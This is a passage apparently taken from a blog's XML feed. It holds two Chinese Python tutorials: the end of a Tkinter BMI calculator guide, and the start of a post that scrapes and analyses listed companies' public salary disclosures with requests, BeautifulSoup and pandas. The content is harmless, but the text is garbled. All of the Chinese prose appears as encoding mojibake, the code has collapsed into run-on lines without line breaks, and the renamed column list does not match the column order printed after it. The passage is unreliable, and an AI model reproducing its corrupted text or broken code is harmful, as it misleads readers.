é€é command åƒæ•¸å¯ä»¥å°‡ calculate_bmi_number äº‹ä»¶è™•ç†å‡½å¼ç¶å®šåˆ°å…ƒä»¶ä¸Š
calculate_btn = tk.Button(window, text=&#x27;é¦¬ä¸Šè¨ˆç®—&#x27;, command=calculate_bmi_number)

å®Œæ•´ç¨‹å¼ç¢¼ï¼š
import tkinter as tkimport mathwindow = tk.Tk()window.title(&#x27;BMI App&#x27;)window.geometry(&#x27;800x600&#x27;)window.configure(background=&#x27;white&#x27;)def calculate_bmi_number():    height = float(height_entry.get())    weight = float(weight_entry.get())    bmi_value = round(weight / math.pow(height, 2), 2)    result = &#x27;ä½ çš„ BMI æŒ‡æ•¸ç‚ºï¼š&#123;&#125; &#123;&#125;&#x27;.format(bmi_value, get_bmi_status_description(bmi_value))    result_label.configure(text=result)def get_bmi_status_description(bmi_value):    if bmi_value &lt; 18.5:        return &#x27;é«”é‡éè¼•å›‰ï¼Œå¤šåƒé»ï¼&#x27;    elif bmi_value &gt;= 18.5 and bmi_value &lt; 24:        return &#x27;é«”é‡å‰›å‰›å¥½ï¼Œç¹¼çºŒä¿æŒï¼&#x27;    elif bmi_value &gt;= 24 :        return &#x27;é«”é‡æœ‰é»éé‡å›‰ï¼Œå°‘åƒå¤šé‹å‹•ï¼&#x27;header_label = tk.Label(window, text=&#x27;BMI è¨ˆç®—å™¨&#x27;)header_label.pack()height_frame = tk.Frame(window)height_frame.pack(side=tk.TOP)height_label = tk.Label(height_frame, text=&#x27;èº«é«˜ï¼ˆmï¼‰&#x27;)height_label.pack(side=tk.LEFT)height_entry = tk.Entry(height_frame)height_entry.pack(side=tk.LEFT)weight_frame = tk.Frame(window)weight_frame.pack(side=tk.TOP)weight_label = tk.Label(weight_frame, text=&#x27;é«”é‡ï¼ˆkgï¼‰&#x27;)weight_label.pack(side=tk.LEFT)weight_entry = tk.Entry(weight_frame)weight_entry.pack(side=tk.LEFT)result_label = tk.Label(window)result_label.pack()calculate_btn = tk.Button(window, text=&#x27;é¦¬ä¸Šè¨ˆç®—&#x27;, command=calculate_bmi_number)calculate_btn.pack()window.mainloop()

æœ€å¾Œæˆæœï¼š
ç¸½çµä»¥ä¸Šé€é Python å…§å»ºçš„ Tkinter å‡½å¼åº«ä¾†å»ºç«‹ä¸€å€‹ç°¡å–®çš„ BMI è¨ˆç®—æ‡‰ç”¨ç¨‹å¼ï¼Œè®“è®€è€…æ„Ÿå—ä¸€ä¸‹ Python Tkinter è¨­è¨ˆæ¡Œé¢æ‡‰ç”¨ç¨‹å¼çš„æµç¨‹ã€‚äº‹å¯¦ä¸Šï¼ŒTkinter æ”¯æ´ç‰©ä»¶å°å‘æ’°å¯«æ–¹å¼ï¼Œæˆ‘å€‘ä¹Ÿå¯ä»¥å°‡ä»¥ä¸Šç¨‹å¼ç¢¼é‡æ§‹æˆç‰©ä»¶å°å‘æ’°å¯«æ–¹å¼ã€‚æ¯”èµ· CLI ä¾†èªª GUI å°æ–¼ä¸€èˆ¬ä½¿ç”¨è€…åœ¨ä½¿ç”¨ä¸Šç¢ºå¯¦æ˜¯æ¯”è¼ƒæ–¹ä¾¿ï¼Œè‹¥æœ‰èˆˆè¶£çš„è®€è€…ä¹Ÿå¯ä»¥è‡ªå·±å˜—è©¦è£½ä½œå°éŠæˆ²æˆ–æ˜¯æ›´å¤šæœ‰è¶£çš„ä¸åŒæ‡‰ç”¨ã€‚
åƒè€ƒæ–‡ä»¶
tkinter â€” Python interface to Tcl&#x2F;Tk
Python å¿«é€Ÿå…¥é–€æ•™å­¸

é—œæ–¼ä½œè€…@kdchang æ–‡è—å‹é–‹ç™¼è€…ï¼Œå¤¢æƒ³æ˜¯åšå‡ºäººå€‘æƒ³ç”¨çš„ç”¢å“å’Œè¾¦ä¸€æ‰€å¿ƒç›®ä¸­ç†æƒ³çš„å­¸æ ¡ã€‚A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
]]></content>
      <tags>
        <tag>Python</tag>
        <tag>tutorial</tag>
        <tag>tkinter</tag>
        <tag>bmi</tag>
        <tag>gui</tag>
      </tags>
  </entry>
  <entry>
    <title>ä½¿ç”¨ Python è³‡æ–™åˆ†æå’Œè¦–è¦ºåŒ–ä¸Šå¸‚æ«ƒå…¬å¸è–ªè³‡å…¬é–‹è³‡æ–™</title>
    <url>/2019/07/26/how-to-use-taiwan-salary-data-to-do-python-data-analytics-and-data-visualization/</url>
    <content><![CDATA[
å‰è¨€
è­‰äº¤æ‰€ä»Šï¼ˆ28ï¼‰æ—¥åœ¨å…¬é–‹è³‡è¨Šè§€æ¸¬ç«™å…¬å¸ƒä¸Šå¸‚å…¬å¸ç”³å ±ä¹‹107å¹´åº¦ã€Œéæ“”ä»»ä¸»ç®¡è·å‹™ä¹‹å…¨æ™‚å“¡å·¥è–ªè³‡ã€è³‡è¨Šã€‚è—‰ç”±æå‡å“¡å·¥è–ªé…¬è³‡è¨Šé€æ˜åº¦ï¼Œè®“æ‘³é–€è€é—†ç„¡æ‰€éå½¢ã€‚

æ ¹æ“šæ–°èåª’é«”çš„å ±å° è­‰äº¤æ‰€å…¬å¸ƒä¸Šå¸‚å…¬å¸éä¸»ç®¡å…¨æ™‚å“¡å·¥è–ªè³‡ï¼Œè®“æˆ‘å€‘å¯ä»¥ä¸€çªºè¿‘å…©åƒå®¶ï¼ˆ853 + 733ï¼‰ä¸Šå¸‚æ«ƒå…¬å¸çš„è–ªè³‡æ°´æº–ï¼Œä¹Ÿå¯ä»¥çœ‹çœ‹å“ªäº›å…¬å¸è–ªè³‡æ°´æº–ç›¸å°è¼ƒä½ï¼ˆé †ä¾¿çœ‹çœ‹å„ç¨®é€—è¶£çš„ç†ç”±ï¼Ÿæœ¬æ–‡ cover åœ–å³æ˜¯å°‡ä½è–ªå…¬å¸çš„ç†ç”±æ”¾å…¥ wordcloud ç”¢ç”Ÿå™¨ç”¢ç”Ÿçš„åœ–ç‰‡ï¼ï¼‰ï¼Œç•¶ä½œæˆ‘å€‘å°‹æ‰¾åˆé©å·¥ä½œçš„åƒè€ƒä¾æ“šä¹‹ä¸€ï¼ˆä½†è–ªè³‡é«˜ä½ä¸æ˜¯æ±ºå®šåˆé©å·¥ä½œçš„å”¯ä¸€æ¨™æº–ï¼‰ã€‚
ç•¶ç„¶èº«ç‚ºä¸€å€‹ç•¥æ‡‚ç•¥æ‡‚è³‡æ–™åˆ†æçš„è»Ÿé«”å·¥ç¨‹å¸«ï¼Œæˆ‘å€‘ç•¶ç„¶ä¸èƒ½åªçœ‹æ–°èåª’é«”æ‰€æä¾›çš„åŠ å·¥éçš„äºŒæ‰‹è³‡æ–™ï¼Œæ›´æ‡‰è©²è¦ªè‡ªå‹•æ‰‹ hands on ä¾†é€²è¡Œè³‡æ–™æ¢ç´¢çœ‹çœ‹æœ‰å“ªäº›æœ‰è¶£çš„å° insightã€‚å› æ­¤æ¥ä¸‹ä¾†æˆ‘å€‘å°‡ä½¿ç”¨ Python ç¶²è·¯çˆ¬èŸ²çˆ¬å–è­‰äº¤æ‰€å…¬é–‹è³‡è¨Šè§€æ¸¬ç«™ä¸Šçš„ä¸Šå¸‚æ«ƒå…¬å¸ã€Œéæ“”ä»»ä¸»ç®¡è·å‹™ä¹‹å…¨æ™‚å“¡å·¥è–ªè³‡ã€è³‡è¨Šä¸¦ä½¿ç”¨ python pandasã€matplotlib å’Œ jupyter notebook é€²è¡Œè³‡æ–™åˆ†æå’Œè³‡è¨Šè¦–è¦ºåŒ–ï¼Œçœ‹åˆ°æ›´å¤šæœ‰è¶£çš„è–ªæ°´æ•¸æ“šåˆ†æã€‚
è³‡æ–™è’é›† Data Collect &#x2F; Data Scraping
æ­£æ‰€è¬‚å·§å©¦é›£ç‚ºç„¡ç±³ä¹‹ç‚Šï¼Œè³‡æ–™åˆ†æé›£ç‚ºæ²’ dataï¼ æ‰€ä»¥åœ¨æ±ºå®šè¦é€²è¡Œä¸Šå¸‚æ«ƒå…¬å¸çš„è–ªè³‡è³‡æ–™å¾Œï¼Œæˆ‘å€‘å¿…é ˆè’é›†ç›¸é—œçš„è³‡æ–™ä»¥åˆ©å¾ŒçºŒåˆ†æã€‚
ä¸€é–‹å§‹æˆ‘å€‘å…ˆä¾†åˆ° è­‰äº¤æ‰€å…¬é–‹è³‡è¨Šè§€æ¸¬ç«™ ä¾†è§€å¯Ÿå¦‚ä½•çˆ¬å–éæ“”ä»»ä¸»ç®¡è·å‹™ä¹‹å…¨æ™‚å“¡å·¥è–ªè³‡è³‡è¨Šã€‚

ç¶“éä¸€ç•ªè§€å¯Ÿå¾Œç™¼ç¾ç•¶ä¸‹æ‹‰é¸å–®é¸æ“‡æ™‚æœƒä½¿ç”¨ ajax å»å¾Œç«¯ api æ“·å–è³‡æ–™ã€‚æ‰€ä»¥æˆ‘å€‘å¯ä»¥é€é POST https://mops.twse.com.tw/mops/web/ajax_t100sb15 é€™å€‹ endpoint å»å–å¾—è–ªè³‡è³‡æ–™ã€‚


ç”±æ–¼è³‡æ–™é›†çš„æ¬„ä½æœ‰åˆä½µçš„éƒ¨åˆ†ï¼Œæ‰€ä»¥æˆ‘å€‘æ‹¿æ‰ éæ“”ä»»ä¸»ç®¡è·å‹™ä¹‹å…¨æ™‚å“¡å·¥è³‡è¨Šã€åŒæ¥­å…¬å¸è³‡è¨Š å’Œ è–ªè³‡çµ±è¨ˆæƒ…å½¢ è®“ columns å¯ä»¥æ›´å–®ç´”ï¼Œä»¥åˆ©æ–¼æ¥ä¸‹ä¾†ä½¿ç”¨ pandas é€²è¡Œè³‡æ–™åˆ†æã€‚
from collections import OrderedDictimport requestsimport pandas as pdfrom bs4 import BeautifulSoupclass HTMLTableParser:    def get_html_tables_from_resp(self, html_text):        soup = BeautifulSoup(html_text, &#x27;html.parser&#x27;)        tables = soup.find_all(&#x27;table&#x27;)        return tables    def parse_html_table(self, table):        &quot;&quot;&quot;        &lt;tr&gt;            &lt;th align=&quot;center&quot; class=&quot;tblHead&quot; nowrap=&quot;&quot; rowspan=&quot;2&quot;&gt;ç”¢æ¥­é¡åˆ¥&lt;/th&gt;            &lt;th align=&quot;center&quot; class=&quot;tblHead&quot; nowrap=&quot;&quot; rowspan=&quot;2&quot;&gt;å…¬å¸ä»£è™Ÿ&lt;/th&gt;            &lt;th align=&quot;center&quot; class=&quot;tblHead&quot; nowrap=&quot;&quot; rowspan=&quot;2&quot;&gt;å…¬å¸åç¨±&lt;/th&gt;            &lt;th align=&quot;center&quot; class=&quot;tblHead&quot; colspan=&quot;4&quot; nowrap=&quot;&quot;&gt;éæ“”ä»»ä¸»ç®¡è·å‹™ä¹‹&lt;br/&gt;å…¨æ™‚å“¡å·¥è³‡è¨Š&lt;/th&gt;            &lt;th align=&quot;center&quot; class=&quot;tblHead&quot; colspan=&quot;2&quot; nowrap=&quot;&quot;&gt;åŒæ¥­å…¬å¸è³‡è¨Š&lt;/th&gt;            &lt;th align=&quot;center&quot; class=&quot;tblHead&quot; colspan=&quot;4&quot; nowrap=&quot;&quot;&gt;è–ªè³‡çµ±è¨ˆæƒ…å½¢&lt;/th&gt;        &lt;/tr&gt;        &lt;tr&gt;            &lt;th align=&quot;center&quot; class=&quot;tblHead&quot; nowrap=&quot;&quot;&gt;å“¡å·¥è–ªè³‡ç¸½é¡(ä»Ÿå…ƒ)&lt;/th&gt;            &lt;th align=&quot;center&quot; class=&quot;tblHead&quot; nowrap=&quot;&quot;&gt;å“¡å·¥äººæ•¸-åŠ æ¬Šå¹³å‡(äºº)&lt;/th&gt;            &lt;th align=&quot;center&quot; class=&quot;tblHead&quot; nowrap=&quot;&quot;&gt;å“¡å·¥è–ªè³‡-å¹³å‡æ•¸(ä»Ÿå…ƒ/äºº)&lt;/th&gt;            &lt;th align=&quot;center&quot; class=&quot;tblHead&quot; nowrap=&quot;&quot;&gt;æ¯è‚¡ç›ˆé¤˜(å…ƒ/è‚¡)&lt;/th&gt;            &lt;th align=&quot;center&quot; class=&quot;tblHead&quot; nowrap=&quot;&quot;&gt;å“¡å·¥è–ªè³‡-å¹³å‡æ•¸(ä»Ÿå…ƒ/äºº)&lt;/th&gt;            &lt;th align=&quot;center&quot; class=&quot;tblHead&quot; nowrap=&quot;&quot;&gt;å¹³å‡æ¯è‚¡ç›ˆé¤˜(å…ƒ/è‚¡)&lt;/th&gt;            &lt;th align=&quot;center&quot; class=&quot;tblHead&quot; nowrap=&quot;&quot;&gt;éç¶“ç†äººä¹‹&lt;br/&gt;å…¨æ™‚å“¡å·¥è–ªè³‡&lt;br/&gt;å¹³å‡æ•¸æœªé”50è¬å…ƒ&lt;/th&gt;            &lt;th align=&quot;center&quot; class=&quot;tblHead&quot; nowrap=&quot;&quot;&gt;å…¬å¸EPSç²åˆ©è¡¨ç¾è¼ƒåŒæ¥­ç‚ºä½³&lt;br/&gt;ï¼ŒæƒŸéç¶“ç†äººä¹‹å…¨æ™‚å“¡å·¥&lt;br/&gt;è–ªè³‡å¹³å‡æ•¸ä½æ–¼åŒæ¥­æ°´æº–&lt;/th&gt;            &lt;th align=&quot;center&quot; class=&quot;tblHead&quot; nowrap=&quot;&quot;&gt;å…¬å¸EPSè¼ƒå‰ä¸€å¹´åº¦æˆé•·&lt;br/&gt;ï¼ŒæƒŸéç¶“ç†äººä¹‹å…¨æ™‚å“¡å·¥&lt;br/&gt;è–ªè³‡å¹³å‡æ•¸è¼ƒå‰ä¸€å¹´åº¦æ¸›å°‘&lt;/th&gt;            &lt;th align=&quot;center&quot; class=&quot;tblHead&quot; nowrap=&quot;&quot;&gt;å…¬å¸ç¶“ç‡Ÿç¸¾æ•ˆèˆ‡å“¡å·¥è–ªé…¬&lt;br/&gt;ä¹‹é—œè¯æ€§åŠåˆç†æ€§èªªæ˜&lt;/th&gt;        &lt;/tr&gt;        &lt;tr&gt;            &lt;td nowrap=&quot;&quot; style=&quot;text-align:left !important;&quot;&gt;è³‡è¨Šæœå‹™æ¥­&lt;/td&gt;            &lt;td nowrap=&quot;&quot; style=&quot;text-align:left !important;&quot;&gt;8416&lt;/td&gt;            &lt;td nowrap=&quot;&quot; style=&quot;text-align:left !important;&quot;&gt;å¯¦å¨&lt;/td&gt;            &lt;td nowrap=&quot;&quot; style=&quot;text-align:right !important;&quot;&gt;Â 158,636Â &lt;/td&gt;            &lt;td nowrap=&quot;&quot; style=&quot;text-align:right !important;&quot;&gt;Â 186Â &lt;/td&gt;            &lt;td nowrap=&quot;&quot; style=&quot;text-align:right !important;&quot;&gt;Â 853Â &lt;/td&gt;            &lt;td nowrap=&quot;&quot; style=&quot;text-align:right !important;&quot;&gt;Â 9.69Â &lt;/td&gt;            &lt;td nowrap=&quot;&quot; style=&quot;text-align:right !important;&quot;&gt;Â 807Â &lt;/td&gt;            &lt;td nowrap=&quot;&quot; style=&quot;text-align:right !important;&quot;&gt;Â 1.20Â &lt;/td&gt;            &lt;td nowrap=&quot;&quot; style=&quot;text-align:right !important;&quot;&gt;&lt;/td&gt;            &lt;td nowrap=&quot;&quot; style=&quot;text-align:right !important;&quot;&gt;&lt;/td&gt;            &lt;td nowrap=&quot;&quot; style=&quot;text-align:right !important;&quot;&gt;&lt;/td&gt;            &lt;td nowrap=&quot;&quot; style=&quot;text-align:left !important;&quot;&gt;&lt;br/&gt;&lt;/td&gt;        &lt;/tr&gt;        &quot;&quot;&quot;        parsed_data = []        # Find number of rows and columns        # we also find the column titles if we can        table_row_tags = table.find_all(&#x27;tr&#x27;)        table_header_tags = table.find_all(&#x27;th&#x27;)        column_names = [table_header_tag.get_text() for key, table_header_tag in enumerate(table_header_tags) if key not in (3, 4, 5)]        column_names[7] = &#x27;åŒæ¥­å…¬å¸&#123;&#125;&#x27;.format(column_names[7])        column_names[8] = &#x27;åŒæ¥­å…¬å¸&#123;&#125;&#x27;.format(column_names[8])        tr_td_tags = [            [td_tag.get_text().strip() for td_tag in table_row.find_all(&#x27;td&#x27;)]            for table_row in table_row_tags if table_row.find_all(&#x27;td&#x27;)        ]        parsed_data = [            OrderedDict(&#123;                column_names[index]: td_tag                for index, td_tag in enumerate(tr_td_tag)            &#125;)            for tr_td_tag in tr_td_tags        ]        df = pd.DataFrame.from_dict(parsed_data)        return dfhtlm_parser = HTMLTableParser()payload = &#123;    # &#x27;encodeURIComponent&#x27;: 1,    &#x27;step&#x27;: 1,    &#x27;firstin&#x27;: 1,    &#x27;TYPEK&#x27;: &#x27;sii&#x27;, # sii ä¸Šå¸‚ / otc ä¸Šæ«ƒ    &#x27;RYEAR&#x27;: 107,    &#x27;code&#x27;: &#x27;&#x27;,&#125;headers = &#123;&#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36&#x27;&#125;resp = requests.post(&#x27;https://mops.twse.com.tw/mops/web/ajax_t100sb15&#x27;, data=payload, headers=headers, timeout=2)html_tables = htlm_parser.get_html_tables_from_resp(resp.text)df_table = htlm_parser.parse_html_table(html_tables[0])df_table.to_csv(&#x27;107_&#123;&#125;.csv&#x27;.format(payload[&#x27;TYPEK&#x27;]), index=False, encoding=&#x27;utf-8&#x27;)print(df_table)

è³‡æ–™å‰è™•ç† Data Preprocessingè³‡æ–™å‰è™•ç†æ˜¯è³‡æ–™æ¢å‹˜å’Œè³‡æ–™åˆ†ææµç¨‹æ­¥é©Ÿä¹‹ä¸€ï¼Œä¸»è¦ç›®çš„æ˜¯å°‡çœŸå¯¦ä¸–ç•Œçš„è³‡æ–™é€²è¡Œæ•´ç†è½‰åŒ–ï¼Œè®Šå¾—å¯ä»¥é–±è®€å’Œåˆ†æã€‚
åœ¨è’é›†å®Œè³‡æ–™å¾Œï¼Œæˆ‘å€‘å°‡ä½¿ç”¨ pandas è¼‰å…¥æˆ‘å€‘æŠ“å–çš„ä¸Šå¸‚æ«ƒå…¬å¸è–ªè³‡çš„ .csv æª”æ¡ˆä¾†é€²è¡Œåˆ†æ ä¸¦é€²è¡Œè³‡æ–™å‰è™•ç†ã€‚æˆ‘å€‘è »å¹¸é‹çš„æ˜¯é€™å€‹è³‡æ–™é›†ç®—æ˜¯å®Œæ•´ä¸”æ˜¯çµæ§‹åŒ–è³‡æ–™ï¼Œä¸å¤ªéœ€è¦åšå¤ªå¤šçš„è³‡æ–™å‰è™•ç†ï¼ˆä¾‹å¦‚ï¼šè£œå€¼ã€åˆªé™¤éºæ¼å€¼ç­‰ï¼‰ï¼Œä¸»è¦è¦åšçš„æ˜¯ columns åç¨±èª¿æ•´å’Œå“¡å·¥è–ªè³‡å€¼çš„å–ä»£å’Œè½‰æ›æˆæ•´æ•¸ã€‚
ä¸Šå¸‚å…¬å¸çš„ 107_sii.csv æª”æ¡ˆï¼š


ä¸Šæ«ƒå…¬å¸çš„ 107_otc.csv æª”æ¡ˆï¼š


æ¥è‘—æˆ‘å€‘ä¾†é€²è¡Œè³‡æ–™çš„å‰è™•ç†ï¼Œæ–¹ä¾¿æ¥ä¸‹ä¾†çš„æ¢ç´¢æ€§è³‡æ–™åˆ†æï¼Œé¦–å…ˆè¼‰å…¥ pandasã€matplotlib å‡½å¼åº«ä¸¦ä½¿ç”¨ pandas è¼‰å…¥è³‡æ–™é›†

import pandas as pdimport matplotlib.pyplot as pltdf_sii = pd.read_csv(&#x27;./107_sii.csv&#x27;)df_otc = pd.read_csv(&#x27;./107_otc.csv&#x27;)df_sii.shape# (853, 13) å…±æœ‰ 853 å®¶ä¸Šå¸‚å…¬å¸è³‡æ–™ï¼Œ13 å€‹æ¬„ä½df_otc.shape# (733, 13) å…±æœ‰ 733 å®¶ä¸Šå¸‚å…¬å¸è³‡æ–™ï¼Œ13 å€‹æ¬„ä½df_sii.index# RangeIndex(start=0, stop=853, step=1)df_sii.values&quot;&quot;&quot;array([[&#x27;æ°´æ³¥å·¥æ¥­&#x27;, 1101, &#x27;å°æ³¥&#x27;, ..., nan, nan, nan],       [&#x27;æ°´æ³¥å·¥æ¥­&#x27;, 1102, &#x27;äºæ³¥&#x27;, ..., nan, nan, nan],       [&#x27;æ°´æ³¥å·¥æ¥­&#x27;, 1103, &#x27;å˜‰æ³¥&#x27;, ..., nan, nan, nan],       ...,       [&#x27;å»ºæç‡Ÿé€ &#x27;, 9946, &#x27;ä¸‰ç™¼åœ°ç”¢&#x27;, ..., nan, nan, nan],       [&#x27;å…¶ä»–&#x27;, 9955, &#x27;ä½³é¾&#x27;, ..., nan, nan, nan],       [&#x27;é‹¼éµå·¥æ¥­&#x27;, 9958, &#x27;ä¸–ç´€é‹¼æ§‹&#x27;, ..., nan, nan, nan]], dtype=object)&quot;&quot;&quot;df_sii.columns&quot;&quot;&quot;Index([&#x27;ç”¢æ¥­é¡åˆ¥&#x27;, &#x27;å…¬å¸ä»£è™Ÿ&#x27;, &#x27;å…¬å¸åç¨±&#x27;, &#x27;å“¡å·¥è–ªè³‡ç¸½é¡(ä»Ÿå…ƒ)&#x27;, &#x27;å“¡å·¥äººæ•¸-åŠ æ¬Šå¹³å‡(äºº)&#x27;, &#x27;å“¡å·¥è–ªè³‡-å¹³å‡æ•¸(ä»Ÿå…ƒ/äºº)&#x27;,       &#x27;æ¯è‚¡ç›ˆé¤˜(å…ƒ/è‚¡)&#x27;, &#x27;åŒæ¥­å…¬å¸å“¡å·¥è–ªè³‡-å¹³å‡æ•¸(ä»Ÿå…ƒ/äºº)&#x27;, &#x27;åŒæ¥­å…¬å¸å¹³å‡æ¯è‚¡ç›ˆé¤˜(å…ƒ/è‚¡)&#x27;,       &#x27;éç¶“ç†äººä¹‹å…¨æ™‚å“¡å·¥è–ªè³‡å¹³å‡æ•¸æœªé”50è¬å…ƒ&#x27;, &#x27;å…¬å¸EPSç²åˆ©è¡¨ç¾è¼ƒåŒæ¥­ç‚ºä½³ï¼ŒæƒŸéç¶“ç†äººä¹‹å…¨æ™‚å“¡å·¥è–ªè³‡å¹³å‡æ•¸ä½æ–¼åŒæ¥­æ°´æº–&#x27;,       &#x27;å…¬å¸EPSè¼ƒå‰ä¸€å¹´åº¦æˆé•·ï¼ŒæƒŸéç¶“ç†äººä¹‹å…¨æ™‚å“¡å·¥è–ªè³‡å¹³å‡æ•¸è¼ƒå‰ä¸€å¹´åº¦æ¸›å°‘&#x27;, &#x27;å…¬å¸ç¶“ç‡Ÿç¸¾æ•ˆèˆ‡å“¡å·¥è–ªé…¬ä¹‹é—œè¯æ€§åŠåˆç†æ€§èªªæ˜&#x27;],      dtype=&#x27;object&#x27;)&quot;&quot;

æ•´é«”è³‡æ–™è³‡è¨Šï¼š
df_sii.info()&lt;class &#x27;pandas.core.frame.DataFrame&#x27;&gt;RangeIndex: 853 entries, 0 to 852Data columns (total 13 columns):ç”¢æ¥­é¡åˆ¥                                    853 non-null objectå…¬å¸ä»£è™Ÿ                                    853 non-null int64å…¬å¸åç¨±                                    853 non-null objectå“¡å·¥è–ªè³‡ç¸½é¡(ä»Ÿå…ƒ)                              853 non-null objectå“¡å·¥äººæ•¸-åŠ æ¬Šå¹³å‡(äºº)                            853 non-null objectå“¡å·¥è–ªè³‡-å¹³å‡æ•¸(ä»Ÿå…ƒ/äºº)                          853 non-null objectæ¯è‚¡ç›ˆé¤˜(å…ƒ/è‚¡)                               853 non-null float64åŒæ¥­å…¬å¸å“¡å·¥è–ªè³‡-å¹³å‡æ•¸(ä»Ÿå…ƒ/äºº)                      853 non-null objectåŒæ¥­å…¬å¸å¹³å‡æ¯è‚¡ç›ˆé¤˜(å…ƒ/è‚¡)                         853 non-null float64éç¶“ç†äººä¹‹å…¨æ™‚å“¡å·¥è–ªè³‡å¹³å‡æ•¸æœªé”50è¬å…ƒ                    66 non-null objectå…¬å¸EPSç²åˆ©è¡¨ç¾è¼ƒåŒæ¥­ç‚ºä½³ï¼ŒæƒŸéç¶“ç†äººä¹‹å…¨æ™‚å“¡å·¥è–ªè³‡å¹³å‡æ•¸ä½æ–¼åŒæ¥­æ°´æº–    142 non-null objectå…¬å¸EPSè¼ƒå‰ä¸€å¹´åº¦æˆé•·ï¼ŒæƒŸéç¶“ç†äººä¹‹å…¨æ™‚å“¡å·¥è–ªè³‡å¹³å‡æ•¸è¼ƒå‰ä¸€å¹´åº¦æ¸›å°‘     0 non-null float64å…¬å¸ç¶“ç‡Ÿç¸¾æ•ˆèˆ‡å“¡å·¥è–ªé…¬ä¹‹é—œè¯æ€§åŠåˆç†æ€§èªªæ˜                   207 non-null objectdtypes: float64(3), int64(1), object(9)memory usage: 86.7+ KB

è§€çœ‹å‰é¢å¹¾ç­†è³‡æ–™é•·ç›¸ï¼š
$ df_sii.head()


å°‡ columns åç¨±èª¿æ•´æˆè‹±æ–‡ï¼Œæ–¹ä¾¿åˆ†ææ“ä½œ
headers = [&#x27;industry&#x27;,&#x27;company_code&#x27;, &#x27;company_people_count&#x27;, &#x27;company_name&#x27;, &#x27;company_total_salary&#x27;, &#x27;company_average_salary&#x27;, &#x27;company_eps&#x27;, &#x27;industry_average_salary&#x27;, &#x27;industry_average_eps&#x27;, &#x27;is_under_50&#x27;, &#x27;high_eps_low_salary&#x27;, &#x27;growth_but_low_salary&#x27;, &#x27;low_salary_reason&#x27;]df_sii.columns = headersdf_otc.columns = headersdf_sii.columnsIndex([&#x27;industry&#x27;, &#x27;company_code&#x27;, &#x27;company_name&#x27;, &#x27;company_people_count&#x27;,       &#x27;company_total_salary&#x27;, &#x27;company_average_salary&#x27;, &#x27;company_eps&#x27;,       &#x27;industry_average_salary&#x27;, &#x27;industry_average_eps&#x27;, &#x27;is_under_50&#x27;,       &#x27;high_eps_low_salary&#x27;, &#x27;growth_but_low_salary&#x27;, &#x27;low_salary_reason&#x27;],      dtype=&#x27;object&#x27;)

èª¿æ•´ column éå¾Œï¼š
df_sii.info()&lt;class &#x27;pandas.core.frame.DataFrame&#x27;&gt;RangeIndex: 853 entries, 0 to 852Data columns (total 13 columns):industry                   853 non-null objectcompany_code               853 non-null int64company_name               853 non-null objectcompany_total_salary       853 non-null objectcompany_people_count       853 non-null objectcompany_average_salary     853 non-null int64company_eps                853 non-null float64industry_average_salary    853 non-null objectindustry_average_eps       853 non-null float64is_under_50                66 non-null objecthigh_eps_low_salary        142 non-null objectgrowth_but_low_salary      0 non-null float64low_salary_reason          207 non-null objectdtypes: float64(3), int64(2), object(8)memory usage: 86.7+ KB

å°‡å“¡å·¥è–ªè³‡-å¹³å‡æ•¸(ä»Ÿå…ƒ&#x2F;äºº) , å»é™¤ä¸¦å°‡å­—ä¸² str è½‰ç‚º float
df_sii[&#x27;company_average_salary&#x27;] = df_sii[&#x27;company_average_salary&#x27;].str.replace(&#x27;,&#x27;, &#x27;&#x27;).astype(int)df_otc[&#x27;company_average_salary&#x27;] = df_otc[&#x27;company_average_salary&#x27;].str.replace(&#x27;,&#x27;, &#x27;&#x27;).astype(int)

æ–°çš„è³‡æ–™é•·ç›¸ï¼š
df_sii.head()


æ¢ç´¢æ€§è³‡æ–™åˆ†æ Explore Data Analyticsæ¢ç´¢æ€§è³‡æ–™åˆ†ææ˜¯è³‡æ–™åˆ†æçš„ä¸€å€‹æ­¥é©Ÿï¼Œé€éæ•˜è¿°çµ±è¨ˆã€åœ–è¡¨åˆ†æç­‰æ–¹å¼ä¾†äº†è§£è³‡æ–™ï¼ˆä¾‹å¦‚ï¼šæœ€å¤§ã€æœ€å°å€¼ã€å¹³å‡å€¼ã€æ¨™æº–å·®ã€é›¢ç¾¤å€¼ç­‰ï¼‰ï¼Œæ‰¾å‡ºå‡è¨­å’Œå¯èƒ½çš„ç‰¹å¾µå€¼ã€‚
åœ¨é€²è¡Œå®Œè³‡æ–™å‰è™•ç†å¾Œæˆ‘å€‘è¦ä¾†é€²è¡Œæ¢ç´¢æ€§è³‡æ–™åˆ†æï¼Œçœ‹çœ‹æœ‰å“ªäº›æœ‰è¶£çš„è³‡æ–™çµ„åˆã€ç›¸é—œæ€§å’Œåœ–è¡¨ã€‚

é¦–å…ˆæˆ‘å€‘ä¾†çœ‹çœ‹ä¸€äº›åŸºæœ¬çš„æ•˜è¿°çµ±è¨ˆï¼š
 df_sii.describe()

 
 å–”å–”ï¼Œ853 å®¶ä¸Šæ˜¯å…¬å¸å¹³å‡è–ªè³‡é” 82 è¬ï¼ŒæŒºä¸éŒ¯çš„å‘€ï¼ä½†è¨˜å¾—é€™æ˜¯å¹³å‡æ•¸ï¼ˆé¦–å¯Œè·Ÿä½ çš„å¹³å‡ï¼‰ã€‚EPS å¹³å‡æœ‰ 2.73 å·¦å³ã€‚ä¾†çœ‹çœ‹è–ªè³‡æ’åï¼š
 df_sii.sort_values([&#x27;company_average_salary&#x27;], ascending=False)

 æœ€å¤§å€¼ç•¶ç„¶å°±æ˜¯åª’é«”çˆ­ç›¸å ±å°çš„ç™¼å“¥è¯ç™¼ç§‘çš„ 270 è¬ï¼Œéƒ­è‘£äº‹é•·çš„é´»æµ·ä¹Ÿæ˜¯æ¦œä¸Šæœ‰åå•¦ï¼Œç•¶ç„¶æˆ‘å€‘å°ç£ä¹‹å…‰å°ç©é›»ä¹Ÿæ˜¯ååˆ—å‰èŒ…ï¼ˆè®“äººè‚…ç„¶èµ·æ•¬çš„é‚„æ˜¯å°ç©é›»å“¡å·¥æ•¸é‡ä¹Ÿæ˜¯ç›¸ç•¶å¤šï¼‰ï¼š
 
 æœ€å°å€¼å‰‡æ˜¯é£Ÿå“å…¬å¸èˆˆæ³°çš„ 34 è¬ï¼ˆå—¯ï¼Œæœˆè–ªç´„ NT 28,500ï¼Œæ¯” 22k å¥½ä¸€é»ï¼‰
 df_sii.sort_values([&#x27;company_average_salary&#x27;], ascending=True)

 
